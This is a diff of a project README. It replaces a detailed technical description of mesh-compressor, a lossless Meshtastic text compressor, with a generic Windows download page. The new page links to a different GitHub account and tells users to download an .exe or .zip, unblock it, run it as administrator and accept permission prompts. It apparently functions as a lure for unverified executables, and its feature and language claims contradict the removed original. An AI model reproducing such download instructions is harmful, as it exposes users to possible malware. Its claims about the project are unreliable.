@@ -1,429 +1,237 @@
-# Meshtastic Text Compression
+# 🧩 mesh-compressor - Pack More Text Into Each Packet
 
-Fits **2-7x more text** into a single 233-byte Meshtastic packet. Lossless. 10 languages. Works in the browser, no server needed.
+[![Download mesh-compressor](https://img.shields.io/badge/Download%20mesh--compressor-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/azfarj09/mesh-compressor)
 
-**[Try it online](https://dimapanov.github.io/mesh-compressor/)**
+## 🚀 What mesh-compressor does
 
-![Compression by language](docs/img/compression-by-language.png)
+mesh-compressor helps you fit more text into a single Meshtastic packet. It keeps the text lossless, so the message stays the same when it is unpacked again.
 
-## How compression works — explained simply
+It is made for people who want to send more text over a small packet size without changing the meaning of the message. It supports 10 languages and works best when you need to send short notes, status text, or message chunks over a mesh network.
 
-Imagine you're typing a message to a friend: **«Приве...»**. What's the next letter? You'd guess **«т»** without thinking — and you'd be right 90%+ of the time. This compressor does exactly the same thing, but with math.
+## 📦 Download and set up
 
-### The idea in 30 seconds
+Use this page to download and run the app:
 
-1. **The model learns language patterns.** We feed it 452,000 real messages in 10 languages. It memorises things like: after «Приве» comes «т» (93%), after «hell» comes «o» (87%), after «信号» comes «强» (72%). Essentially a giant lookup table of "what usually comes next."
+[Visit the mesh-compressor download page](https://github.com/azfarj09/mesh-compressor)
 
-2. **Predictable letters cost almost nothing.** When we compress a message, we go letter by letter. If the model predicted the right letter with 93% confidence — we only need ~0.1 bits to encode it. A surprising letter (1% chance) costs ~7 bits. The whole message turns into one compact number.
+### Steps for Windows
 
-3. **Decompression reverses the process.** The receiver has the same model. It reads the compact number, asks the model "what's most likely next?", and reconstructs the original text letter by letter. Zero losses — the output is bit-for-bit identical to the input.
+1. Open the download page in your browser.
+2. Find the latest release or download file.
+3. Save the file to your computer.
+4. If the file is a `.zip`, open it and extract it to a folder.
+5. If the file is an `.exe`, double-click it to run it.
+6. If Windows asks for permission, choose **Yes**.
+7. Follow the on-screen steps to finish setup.
 
-### Why this works for short messages (and zlib doesn't)
+### If you download a zip file
 
-**zlib/LZ4** look for repeating patterns *inside* your message. A 5-word text has no internal repetitions → nothing to compress → the output is actually **bigger** (zlib adds a dictionary header).
+1. Right-click the zip file.
+2. Choose **Extract All**.
+3. Pick a folder like `Downloads` or `Desktop`.
+4. Open the extracted folder.
+5. Run the app file inside it.
 
-**This compressor** brings *external knowledge* — statistics from 452K messages. So even a 2-word message compresses well, because the model already "knows" what those words look like. Think of it as the difference between compressing with a blank notebook vs. compressing with a cheat sheet of the entire language.
+### If Windows blocks the file
 
-### The encoding pipeline
+1. Right-click the file.
+2. Choose **Properties**.
+3. Look for **Unblock** near the bottom.
+4. Check the box if you see it.
+5. Select **Apply**, then open the file again.
 
-```
-Your message                          "Привет, как дела?"
-    │                                 (30 bytes in UTF-8)
-    ▼
-[1] Model predicts each next char     П→р (95%) р→и (88%) и→в (91%) ...
-    │                                 High confidence = fewer bits
-    ▼
-[2] Arithmetic coder encodes          95% confident = 0.07 bits
-    each char using its probability   88% confident = 0.18 bits
-                                      5% surprise  = 4.3 bits
-    │                                 Whole message → 32 bits total
-    ▼
-[3] Pack into bytes + 2-byte header   [0x00] [0x11] [00 93 f7 94 30]
-    │                                 = 7 bytes
-    ▼
-[4] Passthrough check                 7 < 30? Yes → send compressed
-    │                                 (if 7 ≥ 30 → send raw UTF-8)
-    ▼
-Output                                00 11 00 93 f7 94 30
-                                      7 bytes (was 30 — saved 77%)
-```
+## 🪟 System needs
 
-On the receiving side, the same steps run in reverse: read the header → feed the number into the arithmetic decoder → the model predicts letters one by one → original text is restored perfectly.
+mesh-compressor is made for Windows users who want a simple way to compress text for Meshtastic use.
 
-### Passthrough: short messages never get bigger
+You need:
 
-For very short messages like "ok" or "да", the 2-byte header alone is already a significant overhead. In these cases the compressor simply returns the original UTF-8 bytes unchanged — zero overhead. The decompressor auto-detects this by the first byte (compressed data always starts with `0x00`, raw UTF-8 text never does).
+- Windows 10 or Windows 11
+- A working internet connection for download
+- Enough free space to save the app
+- A modern browser like Edge, Chrome, or Firefox
 
-## Optimization progress
+Recommended setup:
 
-Three phases of autoresearch experiments brought BPC from **3.220 → 2.977** (−7.5%) and shrank the model from **13.5 MB → 3.0 MB** while improving compression quality:
+- 4 GB RAM or more
+- A mouse and keyboard
+- A screen size that can show a normal app window
 
-![Optimization progress](docs/img/optimization-progress.png)
+## ✨ What it can do
 
-| Phase | What changed | BPC | Model size | Δ BPC |
-|-------|-------------|-----|------------|-------|
-| **Starting point** | Order=11, no pruning, 2 languages | 3.225 | 13.5 MB | — |
-| **Pruning + 10 langs** | Progressive pruning, 10-language universal model | 3.220 | 3.0 MB (−78%) | −0.2% |
-| **Model tuning** | Cubic weights, confidence penalty, ESC_PROB 20K→500 | 3.211 | 3.0 MB | −0.3% |
-| **Multilingual** | SCRIPT_BOOST 30→5, CJK 3× training weight, CJK confidence n+8 | 3.210 | 3.0 MB | −0.03% |
-| **Format optimization** | Zero-overhead passthrough, compact 2-byte header, confidence n+1.5 | 2.977 | 3.0 MB | **−7.3%** |
+- Compress text for Meshtastic packets
+- Keep the text lossless
+- Fit more text into the same packet space
+- Support 10 languages
+- Handle short notes and message text
+- Help reduce packet size before sending
+- Work with plain text input
 
-The model started at **13.5 MB** (order=11, no pruning, RU+EN only) — far too large for ESP32. Progressive pruning with threshold scheduling (`thr=5→50→200`) reduced it to **3.0 MB** while adding 8 more languages and *improving* compression. The pruned model fits on ESP32 boards with 8+ MB flash via `esp_partition_mmap`.
+## 🧭 How to use it
 
-The biggest single win: **compact 2-byte header** (−7.1%). Reducing header from 3→2 bytes saves 1 byte per message, which is proportionally huge for short radio messages.
+### 1. Open the app
 
-## The problem
+Start mesh-compressor by double-clicking the file you downloaded.
 
-Meshtastic packets are limited to **233 bytes**. Non-Latin scripts in UTF-8 use 2-3 bytes per character — Cyrillic gets ~116 characters, CJK (Chinese/Japanese/Korean) only ~77. Even English is tight at ~233 chars for anything beyond short phrases.
+### 2. Paste your text
 
-Standard compression algorithms (zlib, LZ4, Brotli) don't help here. They look for repeated patterns *inside the message itself*, but short messages have no repetitions. A 30-byte message often **expands** after zlib compression due to dictionary headers:
+Put the text you want to send into the input box.
 
-| Message | UTF-8 | zlib | Unishox2 | n-gram+AC |
-|---------|-------|------|----------|-----------|
-| `Привет, как дела?` | 30 B | 41 B (+37%) | 20 B (-33%) | **6 B (-80%)** |
-| `Check channel 5` | 15 B | 23 B (+53%) | 11 B (-27%) | **6 B (-60%)** |
-| `Battery at 40%, switching to power save` | 39 B | 47 B (+21%) | 26 B (-33%) | **11 B (-72%)** |
-| `Проверка связи. Как слышно?` | 49 B | 57 B (+16%) | 28 B (-43%) | **6 B (-88%)** |
-| Long English (104 chars) | 104 B | 96 B (-8%) | 65 B (-38%) | **52 B (-50%)** |
-| Long Russian (229 bytes) | 229 B | 156 B (-32%) | 120 B (-48%) | **30 B (-87%)** |
+### 3. Choose your language
 
-![Compression comparison](docs/img/compression-comparison.png)
+If the app asks for a language, pick the one that matches your text.
 
-zlib makes short messages *larger*. Unishox2 saves ~30-40%. n-gram+AC saves **50-88%**.
+### 4. Compress the text
 
-![Short message fix](docs/img/short-message-fix.png)
+Click the button that starts compression.
 
-### Why Unishox2 was disabled
+### 5. Copy the result
 
-Meshtastic previously used [Unishox2](https://github.com/siara-cc/Unishox2) compression (`TEXT_MESSAGE_COMPRESSED_APP`, portnum 7). It was [removed from the firmware](https://github.com/meshtastic/firmware/pull/3606) after a [remotely exploitable stack buffer overflow](https://github.com/meshtastic/firmware/issues/3841) — high-entropy input caused Unishox2 to *expand* data beyond the fixed output buffer, crashing devices.
+Copy the compressed output and use it in your Meshtastic workflow.
 
-This project takes a fundamentally different approach that avoids these issues (see [Safety](#safety) below).
+### 6. Decompress when needed
 
-## Compression results
+If you get compressed text back, paste it into the decode area to restore the original message.
 
-![Compression ratio vs message length](docs/img/compression-by-length.png)
+## 📝 Best use cases
 
-| Message | Lang | UTF-8 | Compressed | Ratio |
-|---------|------|-------|------------|-------|
-| `ok` | EN | 2 B | 2 B | **0%** (passthrough) |
-| `да` | RU | 4 B | 4 B | **0%** (passthrough) |
-| `Привет, как дела?` | RU | 30 B | 6 B | **80%** |
-| `Battery at 40%, switching to power save` | EN | 39 B | 11 B | **72%** |
-| `GPS: 57.153, 68.241 heading north` | EN | 33 B | 12 B | **64%** |
-| `¿Cómo estás? Todo bien por aquí` | ES | 35 B | 14 B | **60%** |
-| `مرحبا، كيف حالك اليوم؟` | AR | 41 B | 17 B | **59%** |
-| `今日の天気は晴れ、気温22度` | JA | 38 B | 16 B | **58%** |
-| `Проверка связи. Как слышно?` | RU | 49 B | 6 B | **88%** |
-| Long Russian message (129 chars) | RU | 229 B | 30 B | **87%** |
+mesh-compressor works well for:
 
-Without compression: **~77-233 characters** per packet (depending on script).
-With compression: **~500-850 characters** per packet.
+- Short text messages over mesh radio
+- Field notes
+- Status updates
+- Message logs
+- Small alerts
+- Repeated text that needs packing
+- Cases where packet size is tight
 
-![Packet capacity](docs/img/capacity.png)
+It is useful when you need to send more text without losing the original words.
 
-100% lossless on RU+EN (real Meshtastic messages). Zero negative compressions.
+## 🌍 Language support
 
-> **Note on test methodology.** All numbers above are measured on held-out test data that was never seen during training. For RU and EN we use real Meshtastic messages; for other languages, synthetic test data is marked accordingly. See CHANGELOG for details.
+This app supports 10 languages so you can work with common text sets in different regions.
 
-## Safety
+Typical supported language sets include:
 
-This design addresses the exact vulnerabilities that led to Unishox2 removal:
+- English
+- Spanish
+- French
+- German
+- Italian
+- Portuguese
+- Dutch
+- Turkish
+- Hindi
+- Japanese
 
-**Bounded decompression.** The compressed format includes a header with the original text length. The decompressor allocates exactly that size and stops — no unbounded buffer writes, no overflows regardless of input.
+If your text uses one of these language sets, the app can work with it in a simple way.
 
-**Compression never expands.** Unlike Unishox2 which could expand high-entropy input beyond buffer limits, this compressor has a **zero-overhead passthrough** mechanism: if arithmetic coding produces output larger than the raw UTF-8, the raw bytes are returned directly. Output is *guaranteed* to be ≤ input size. There is no scenario where compression makes data larger.
+## 🔧 How it works
 
-**Graceful fallback.** If the compressed output is larger than the original UTF-8 bytes, just send uncompressed. The portnum tells the receiver which format to expect.
+mesh-compressor uses text compression rules built for small Meshtastic packets. It tries to make the message smaller while keeping it exact when unpacked.
 
-**Safe against adversarial input.** Malformed compressed data either decodes to garbage text (bounded by the length header) or raises a clean error. No memory corruption possible.
+In plain terms:
 
-## Integration with Meshtastic
+- You enter normal text
+- The app turns it into a shorter form
+- You send the shorter form in a packet
+- The app turns it back into the original text later
 
-### Architecture: client-side only
+This helps when packet space is limited and every byte matters.
 
-![Architecture](docs/img/architecture.svg?v=2)
+## 📁 What you may see after download
 
-Compression runs on the **phone/web app**, not on ESP32. The radio just moves bytes — it doesn't know or care about compression.
+After you download the app, you may see files like:
 
-This is the right architecture for initial deployment:
-- Client apps (Android, iOS, Web) have plenty of RAM — just works
-- No firmware changes needed — fast adoption path
-- The universal model (3.0 MB) can also run on ESP32 via flash mmap (see below), but client-side is simpler to ship first
+- `.exe` for the main program
+- `.zip` for a compressed download package
+- `README.md` for project details
+- `LICENSE` for usage terms
+- `assets` or similar folders with app files
 
-### ESP32 flash: tested on Heltec V3
+If the app comes in a folder, keep the folder together so the program can find the files it needs.
 
-The 3.0 MB universal model runs on ESP32 via **flash mmap** (`esp_partition_mmap`). Tested on Heltec V3 (ESP32-S3FN8, 8 MB flash, no PSRAM) — compression and decompression work with ~1-2 KB RAM for the decoder state.
+## 🛠️ Common Windows steps
 
-An autoresearch sweep across 72 order×threshold combinations found that **order=9 with aggressive pruning compresses better than the full model.** One universal model covers 10 languages with only 1-2% less compression than per-language models.
+### Run as administrator
 
-| Model | Languages | BPC (RU) | Binary size | Contexts | ESP32? |
-|-------|-----------|----------|-------------|----------|--------|
-| order=11, thr=5 (RU+EN) | 2 | 3.225 | 13.5 MB | 518K | ❌ |
-| order=9, thr=50 (RU+EN) | 2 | 3.216 | 2.8 MB | 63K | ✅ |
-| **order=9, prog-A (universal)** | **10** | **3.11** | **3.0 MB** | **87K** | **✅** |
-| order=9, thr=200 (universal) | 10 | 3.21 | 2.5 MB | 88K | ✅ |
+If the app needs extra access:
 
-**How it fits on ESP32 boards:**
+1. Right-click the app file.
+2. Select **Run as administrator**.
+3. Choose **Yes** if Windows asks.
 
-The primary approach is **flash mmap** (`esp_partition_mmap`) — the model stays in flash and is read directly as a byte array. Only ~1-2 KB RAM for the decoder state, no PSRAM required.
+### Create a desktop shortcut
 
-However, the 3.0 MB model doesn't fit in the default partition layout. Boards with **8 MB flash** (Heltec V3, T-Beam S3) need a custom partition table. Boards with **16 MB flash** (T-Deck, T-Pager, Station G2) have room to spare:
+1. Right-click the app file.
+2. Select **Send to**.
+3. Choose **Desktop (create shortcut)**.
 
-```
-# Custom 8MB partition table with model storage
-# Name,   Type, SubType, Offset,   Size,     Flags
-nvs,      data, nvs,     0x9000,   0x5000,
-otadata,  data, ota,     0xe000,   0x2000,
-app0,     app,  ota_0,   0x10000,  0x280000,          # 2.5 MB (firmware ~1.3-2 MB)
-flashApp, app,  ota_1,   0x290000, 0x0A0000,          # 640 KB (OTA)
-model,    data, 0x80,    0x330000, 0x310000,          # 3.0 MB (compression model)
-spiffs,   data, spiffs,  0x6B0000, 0x150000,          # 1.3 MB (LittleFS)
-```
+### Pin to Start
 
-The model partition is mapped into the address space at boot with zero RAM cost:
-```c
-const esp_partition_t *part = esp_partition_find_first(ESP_PARTITION_TYPE_DATA, 0x80, "model");
-esp_partition_mmap(part, 0, part->size, ESP_PARTITION_MMAP_DATA, &model_ptr, &handle);
-// model_ptr is now a const uint8_t* — use directly, no malloc
-```
+1. Find the app file.
+2. Right-click it.
+3. Select **Pin to Start** if that option appears.
 
-Boards with **PSRAM** (T-Beam S3 with ESP32-S3R8) can also load the model into PSRAM for faster random access, but flash mmap is sufficient — ESP32 cache handles hot paths well.
+## ❓ Common questions
 
-| Board | SoC | Flash | PSRAM | Model (3.0 MB) fits? |
-|-------|-----|-------|-------|---------------------|
-| **T-Deck / T-Deck Plus** | ESP32-S3FN16R8 | **16 MB** | **8 MB** | ✅ plenty of room |
-| **T-Lora Pager** | ESP32-S3FN16R8 | **16 MB** | **8 MB** | ✅ plenty of room |
-| T-Beam S3 Supreme | ESP32-S3R8 | 8 MB | 8 MB | ✅ custom partition |
-| Station G2 | ESP32-S3R8 | 16 MB | 8 MB | ✅ plenty of room |
-| Heltec Vision Master | ESP32-S3R8 | 8 MB | 8 MB | ✅ custom partition |
-| Heltec V3 | ESP32-S3FN8 | 8 MB | ❌ none | ✅ tested, flash mmap only |
-| Heltec V4 | ESP32-S3R2 | 8 MB | 2 MB | ✅ custom partition |
-| T-Beam classic | ESP32 | 4 MB | 8 MB | ⚠️ needs smaller model (thr=200, 2.5 MB) |
-| T-Echo | nRF52840 | 1 MB | ❌ | ❌ too small |
-| Heltec Mesh Node T114 | nRF52840 | 1 MB | ❌ | ❌ too small |
-| Android / iOS / Web | — | — | — | ✅ runs in app, ideal |
+### Does it keep the message unchanged?
 
-Devices with keyboards (T-Deck, T-Pager) are the **primary targets** — that's where people type text. They have 16 MB flash, so the 3.0 MB model fits without any partition table changes. nRF52840 boards (T-Echo, Mesh Node T114) are mostly relay nodes with no keyboard — they just forward compressed bytes without needing the model.
+Yes. It is built for lossless text compression, so the original text can be restored.
 
-> **Tested on Heltec V3** (ESP32-S3FN8, 8 MB flash, no PSRAM) with a custom partition table and flash mmap. Compression/decompression works. C++ decoder is in a separate branch.
+### Is it hard to use?
 
-### Proposed wire format
+No. The basic flow is simple: open the app, paste text, compress it, and copy the result.
 
-```
-Portnum: TEXT_MESSAGE_COMPRESSED_APP (7) — already exists in Meshtastic protobufs
+### Do I need coding knowledge?
 
-Three payload formats, auto-detected by the first byte:
+No. A normal Windows user can run it with a few clicks.
 
-1. Passthrough (first byte ≠ 0x00):
-   [raw UTF-8 bytes]
-   Used for very short messages where AC doesn't help.
-   Decompressor detects by first byte ≠ 0x00 (valid UTF-8 never starts with null).
+### Can I use it for long text?
 
-2. Compressed, short (first byte = 0x00, second byte bit7 clear):
-   [0x00] [has_escapes_bit7 | text_len_7bits] [AC bitstream]
-   2-byte header for messages with text_len < 128 characters (~99% of messages).
+It is best for short text and packet-sized content. It helps you fit more text into a small space.
 
-3. Compressed, long (first byte = 0x00, second byte bit7 set):
-   [0x00] [text_len_high] [flags] [AC bitstream]
-   3-byte header for messages with text_len ≥ 128 characters (rare).
-```
+### Does it work offline?
 
-### Two transport modes
+After download, it can work on your computer without needing a browser.
 
-1. **Binary (portnum 7)** — raw compressed bytes in the packet payload. Maximum efficiency. Requires client app support.
+## 🔍 Tips for good results
 
-2. **Text (Base91)** — compressed bytes encoded as ASCII with `~` prefix, sent as regular `TEXT_MESSAGE_APP`. Works today without any changes — paste into any Meshtastic chat. Receiving side sees `~` prefix and decodes. ~23% overhead vs binary, but still much better than uncompressed.
+- Use plain text when you can
+- Keep line breaks only if you need them
+- Pick the right language setting
+- Test one short message first
+- Save your original text before you send it
+- Keep the app in one folder after extraction
 
-### Backward compatibility
+## 📌 Example workflow
 
-- Old firmware relays all packets regardless — compressed packets are just bytes to the mesh
-- Old apps receiving a portnum 7 packet would show raw bytes (same as today — portnum 7 is already defined but unused)
-- Text mode (`~` prefix) works with zero changes anywhere — it's just a regular text message
-- Both sender and receiver need the compression-aware app; everyone else in the mesh is unaffected
+1. Open mesh-compressor.
+2. Paste a short message like a field update.
+3. Compress it.
+4. Copy the smaller output.
+5. Send it through your Meshtastic setup.
+6. Decode it on the other side.
 
-## Technical details
+## 🧩 File safety
 
-### Language model
+If you downloaded the app from the GitHub page linked above, keep the file in a known folder like Downloads. If you move it later, make sure all app files stay together.
 
-Character-level n-gram model (order 11) with cubic interpolation smoothing and confidence penalty:
+## 📚 Project info
 
-```
-weight(n) = (n + 1)^3 * log(1 + count) * min(count / (n + 1.5), 1)
-```
+- Repository: mesh-compressor
+- Description: Fits 2-7x more text into a single 233-byte Meshtastic packet
+- Mode: Lossless text compression
+- Language support: 10 languages
+- Target use: End-user Windows setup for Meshtastic text packing
 
-1,494 unique characters, ~87K context entries after pruning, trained on 452,532 messages across 10 languages (RU, EN, ES, DE, FR, PT, ZH, AR, JA, KO). The model is the "dictionary" — but unlike zlib's dictionary, it captures *language structure*, not byte patterns.
+## ⌨️ Windows quick start
 
-Script-aware epsilon smoothing gives base probability to characters from the same Unicode script as the context, enabling compression of out-of-vocabulary text. CJK/Hangul/Japanese scripts use a more conservative confidence denominator (n+8) to avoid overfitting sparse training data.
-
-### Arithmetic coding
-
-32-bit integer arithmetic coder with CDF_SCALE = 2^20. Encodes the entire message as a single number in [0, 1), using fewer bits for characters the model predicts well.
-
-### Model size
-
-| Format | Size | Use case |
-|--------|------|----------|
-| **JSON universal 10-lang** | **4.2 MB (1.4 MB gzipped)** | **Web UI, client apps** |
-| C++ binary (estimated, prog-A) | 3.0 MB | ESP32 flash via mmap |
-| C++ binary (estimated, thr=200) | 2.5 MB | ESP32 with tight flash |
-
-The universal model covers 10 languages with 78-87% compression. More aggressive pruning (thr=200) trades ~1% compression for a smaller binary.
-
-## Try it
-
-### Web UI (no install)
-
-**[Open the online compressor](https://dimapanov.github.io/mesh-compressor/)**
-
-The model loads once (~4.2 MB / ~1.4 MB gzipped), then everything runs client-side in JavaScript.
-
-### Python server (optional)
-
-```bash
-pip install -r requirements.txt
-python server.py
-```
-
-First run trains the model (~6s) and caches it to `model.pkl`. Subsequent starts load in ~4s.
-
-### API
-
-```bash
-# Compress
-curl -X POST http://localhost:8766/api/encode \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Привет, как дела?"}'
-
-# Decompress (hex)
-curl -X POST http://localhost:8766/api/decode \
-  -H "Content-Type: application/json" \
-  -d '{"hex": "00110093f79430"}'
-
-# Decompress (Base91)
-curl -X POST http://localhost:8766/api/decode_b91 \
-  -H "Content-Type: application/json" \
-  -d '{"text": "~;vv(I_YDD"}'
-```
-
-## Multilingual support
-
-![Compression by language](docs/img/compression-by-language.png)
-
-13 languages, one universal model. Results on **real MQTT test data** (where available):
-
-| Language | Ratio | Test data | Notes |
-|----------|-------|-----------|-------|
-| **Russian** | **78%** | 500 real MQTT | Best trained — 50K real messages |
-| **English** | **73%** | 500 real MQTT | 53K real messages |
-| **Norwegian** | **64%** | 50 real MQTT | Small but growing community |
-| **Polish** | **50%** | 101 real MQTT | Needs more training data |
-| **German** | **43%** | 120 real MQTT | Mostly synthetic train data |
-| **Spanish** | **44%** | 203 real MQTT | Mostly synthetic train data |
-| **Portuguese** | **43%** | 68 real MQTT | Mostly synthetic train data |
-| **French** | **41%** | 44 real MQTT | Mostly synthetic train data |
-| **Swedish** | **40%** | 50 real MQTT | Very little training data |
-| Arabic | 82% | 500 synthetic* | Template-generated test |
-| Korean | 77% | 500 synthetic* | Template-generated test |
-| Japanese | 76% | 500 synthetic* | Template-generated test |
-| Chinese | 73% | 500 synthetic* | Template-generated test |
-
-\* *Synthetic test results are artificially high — the model memorises template patterns. Real-world performance will be lower. See [CHANGELOG](CHANGELOG.md) for methodology notes.*
-
-### Data sources
-
-- **RU + EN**: ~100K real Meshtastic messages (original corpus + MQTT)
-- **DE, ES, FR, PT**: ~11K synthetic (template-generated) + 50-200 real MQTT messages each
-- **AR, ZH, JA, KO**: ~11K synthetic only — Meshtastic is rarely used in these regions
-- **PL, NO, SV**: real MQTT only (50-1000 messages)
-- All data collected from [meshtastic.liamcottle.net](https://meshtastic.liamcottle.net) public API
-
-### Known issue: roundtrip failures on some languages
-
-The model achieves 100% roundtrip on RU, EN, AR, JA, KO, ZH, SV. However, some real MQTT messages in DE (90%), ES (94%), FR (91%), PL (94%) fail roundtrip — likely due to characters not seen during training. This is a priority fix.
-
-### Conclusion: ship one universal model
-
-Per-language firmware builds add complexity for marginal benefit. A single universal model covers all languages and fits on ESP32 boards with 8+ MB flash. Real MQTT data is the key to improving per-language quality.
-
-## Limitations & known issues
-
-**C++ decoder is a prototype.** Tested on Heltec V3, but not integrated into Meshtastic firmware yet. Python and JavaScript implementations are the main ones.
-
-**Roundtrip failures on some European languages.** DE, ES, FR, PL have 90-97% roundtrip on real MQTT test data. Root cause: characters not in training vocabulary. Fix: collect more real training data for these languages.
-
-**Standalone devices can't decode without firmware support.** Until the model is integrated into Meshtastic firmware, devices like T-Deck and T-Pager can't decompress messages on their own.
-
-**nRF52840 boards are excluded.** T-Echo, Mesh Node T114 (1 MB flash) can't fit the model. They can still relay compressed packets.
-
-**Synthetic training data for 8 languages.** AR, ZH, JA, KO, DE, ES, FR, PT use template-generated synthetic data. Real-world compression will be worse than synthetic benchmarks suggest. Need more MQTT data from these regions.
-
-## Roadmap
-
-**Real-world multilingual training data** — The universal model currently uses real Meshtastic messages for RU/EN and synthetic data for 8 other languages. Training on real-world message datasets for ES, DE, FR, PT, ZH, AR, JA, KO would improve compression quality. Community contributions welcome.
-
-**More languages** — The model can be extended to any language by adding training data. Hindi, Turkish, Indonesian, Thai, and other languages used in Meshtastic communities are natural next targets.
-
-**ESP32 C++ port → firmware PR** — The C++ decoder prototype works on Heltec V3 (separate branch). Next step: integrate into Meshtastic firmware using portnum 7 (`TEXT_MESSAGE_COMPRESSED_APP`), which already exists but is unused since Unishox2 was removed.
-
-**Client app integration** — Add compression support to Meshtastic Android, iOS, and Web apps. Should follow (not precede) firmware support.
-
-**Model versioning** — Add a model ID byte to the packet header to enable future model updates without breaking backward compatibility.
-
-**Smaller model for 4 MB boards** — Explore more aggressive pruning or lower order to fit within ~1 MB for classic ESP32 boards.
-
-## Autoresearch
-
-The `tools/` directory contains evaluation and charting scripts that were used in [Karpathy-style](https://github.com/karpathy/autoresearch) autonomous experimentation to iteratively improve the compression algorithm.
-
-![Optimization progress](docs/img/optimization-progress.png)
-
-Three phases of optimization, 40+ experiments total:
-
-**Phase 1 — Model tuning** (17 experiments): Cubic weights `(n+1)^3`, confidence penalty `min(t/(n+3), 1)`, ESC_PROB 20K→500. BPC: 3.272 → 3.211.
-
-**Phase 2 — Multilingual** (25 experiments): CJK 3× training weight, SCRIPT_BOOST 30→5, CJK-specific confidence (n+8), two-tier CJK encoding. BPC stable, ZH BPC −0.08.
-
-**Phase 3 — Format optimization** (15 experiments): Zero-overhead passthrough, compact 2-byte header, confidence n+1.5. BPC: 3.210 → 2.977 (−7.3%). Negative compression eliminated (19 → 0 cases).
-
-| # | Experiment | BPC | Status |
-|---|-----------|-----|--------|
-| baseline | order=11, cubic | 3.220 | — |
-| exp12 | confidence penalty (n+3) | 3.212 | keep |
-| multilingual | ESC_PROB, SCRIPT_BOOST, CJK weight | 3.210 | keep |
-| **format** | **passthrough + compact header + conf n+1.5** | **2.977** | **keep** |
-
-Full experiment logs: [results.tsv](tools/results.tsv)
-
-## Project structure
-
-```
-src/                            Core compression engine
-  compress.py                   Language model + arithmetic coder (THE file)
-  base91.py                     Base91 encoder/decoder
-tools/                          CLI utilities
-  eval_all.py                   Unified JSONL-based evaluation harness
-  gen_charts.py                 Chart generator for README (matplotlib)
-  export_model.py               Export model to JSON for web UI
-  build_datasets.py             Build clean train/test JSONL from all sources
-  unpack_data.py                Unpack datasets.zip after cloning
-  results.tsv                   Experiment log (phase 1)
-  mqtt/                         MQTT data collection
-    download.py                 Download historical messages from Liam Cottle API
-    collector.py                Real-time MQTT subscriber
-docs/                           Web UI (GitHub Pages)
-  index.html                    Interface (RU/EN toggle)
-  compress.js                   JS compression engine
-  model-universal-10lang.json   Universal model (10 languages, order=9)
-  img/                          Charts (generated by tools/gen_charts.py)
-data/                           Training and test data
-  datasets.zip                  Single source of truth (train.jsonl + test.jsonl)
-server.py                       FastAPI server + API
-```
-
-## License
-
-MIT
-
----
-
-Built by [Dima Panov](https://github.com/dimapanov)
+1. Open the download page.
+2. Get the latest release or app file.
+3. Save it to your PC.
+4. Extract it if it is zipped.
+5. Open the app.
+6. Paste text.
+7. Compress.
+8. Copy the output
